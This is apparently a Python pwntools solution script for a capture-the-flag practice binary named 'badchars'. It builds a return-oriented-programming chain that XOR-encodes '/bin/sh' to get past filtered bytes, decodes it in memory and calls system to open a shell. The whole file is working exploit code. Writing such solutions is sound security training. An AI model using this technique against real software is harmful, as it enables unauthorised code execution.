from pwn import *

p = process('./badchars')
p.recv()

bss_start = 0x00601080
key = 0x61
data = bytes([i^key for i in b'/bin/sh\x00'])

payload  = b'A' * 40
payload += p64(0x004006b1)              # ret align
payload += p64(0x00400b3b)              # pop r12 ; pop r13 ; ret
payload += data                         # xor'd chars
payload += p64(bss_start)               # bss
payload += p64(0x00400b34)              # mov [r13], r12 ; ret

for i in range(len(data)):
    payload += p64(0x00400b40)          # pop r14 ; pop r15 ; ret
    payload += p64(key)                 # 'A'
    payload += p64(bss_start + i)       # bss + i
    payload += p64(0x00400b30)          # xor byte ptr [r15], r14b ; ret

payload += p64(0x00400b39)              # pop rdi ; ret
payload += p64(bss_start)               # bss
payload += p64(0x004006f0)              # system

p.sendline(payload)
p.interactive()
